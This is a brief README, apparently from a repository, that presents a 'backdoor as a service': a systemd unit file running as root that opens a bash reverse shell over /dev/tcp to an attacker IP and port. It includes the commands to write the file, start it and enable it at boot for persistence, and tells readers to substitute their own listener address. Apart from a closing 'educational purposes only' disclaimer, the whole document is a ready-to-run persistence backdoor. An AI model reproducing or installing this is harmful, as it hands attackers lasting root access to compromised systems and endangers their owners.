# Backdoor as a Service
Backdoors as services (BaaS) for unauthorized access. Below is an example of a BaaS configuration encapsulated in a single file (`backdoor.service`)

## Setup
the file have to be placed only in /etc/systemd/system/ and named as .service file
for create the file run 
```bash
echo '[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.1.107/4444 0>&1"
[Install]
WantedBy=multi-user.target' > backdoor.service
```
clean code
```ini
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.1.107/4444 0>&1"

[Install]
WantedBy=multi-user.target
```
## When this service is initiated, it establishes a reverse shell connection to the attacker.
```bash
systemctl start backdoor.service
```
## To persist across reboots, execute the following command
```bash
systemctl enable backdoor.service
```
## Remember 
to replace `192.168.1.107` and `4444` with your desired IP address and port. 

## Disclaimer 
⚠️ Disclaimer: This repository is for educational purposes only. The examples provided should not be used for any malicious activities. Always ensure that you have proper authorization before attempting any security-related actions.
